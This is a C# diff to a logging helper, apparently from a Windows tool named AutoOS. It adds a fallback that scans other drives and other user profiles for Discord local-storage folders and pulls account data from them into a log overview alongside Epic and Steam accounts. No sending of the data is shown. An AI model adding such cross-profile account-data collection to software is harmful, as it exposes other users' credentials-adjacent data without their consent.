@@ -112,7 +112,7 @@ public static partial class LogHelper
             sb.AppendLine($"- **RegistryPath**: `{device.RegistryPath}`");
             sb.AppendLine($"- **Driver**: `{device.DriverType} {device.CurrentVersion}`");
 
-            var settings = AutoOS.Core.Helpers.Network.NetworkHelper.GetAdvancedSettings(device);
+            var settings = Network.NetworkHelper.GetAdvancedSettings(device);
             foreach (var setting in settings.OrderBy(s => s.Name))
             {
                 sb.AppendLine();
@@ -162,6 +162,42 @@ public static partial class LogHelper
     private static JsonObject GetOverview(IEnumerable<GpuInfo> selectedGpus = null, bool includeVendorId = false, Exception ex = null, string actionTitle = null)
     {
         var discordAccounts = DiscordHelper.GetAccountData(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "Local Storage", "leveldb"));
+
+        if (discordAccounts == null || discordAccounts.Count == 0)
+        {
+            var systemDrive = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
+            var foundFolders = DriveInfo.GetDrives()
+                .Where(d => d.DriveType == DriveType.Fixed && d.Name != systemDrive)
+                .SelectMany(d =>
+                {
+                    string usersPath = Path.Combine(d.Name, "Users");
+                    if (!Directory.Exists(usersPath)) return [];
+
+                    return Directory.GetDirectories(usersPath)
+                        .Select(userDir => Path.Combine(userDir, "AppData", "Roaming", "discord", "Local Storage", "leveldb"))
+                        .Where(Directory.Exists);
+                })
+                .Select(path => new DirectoryInfo(path))
+                .ToList();
+
+            var sortedFolders = foundFolders.OrderByDescending(folder => folder.LastWriteTime).ToList();
+
+            foreach (var folder in sortedFolders)
+            {
+                var accounts = DiscordHelper.GetAccountData(folder.FullName);
+
+                if (accounts != null && accounts.Count > 0)
+                {
+                    discordAccounts = accounts;
+                    foreach (var account in discordAccounts)
+                    {
+                        account.IsActive = false;
+                    }
+                    break;
+                }
+            }
+        }
+
         var epicAccounts = EpicGamesHelper.GetEpicGamesAccounts();
         var steamAccounts = SteamHelper.GetSteamAccounts();
 
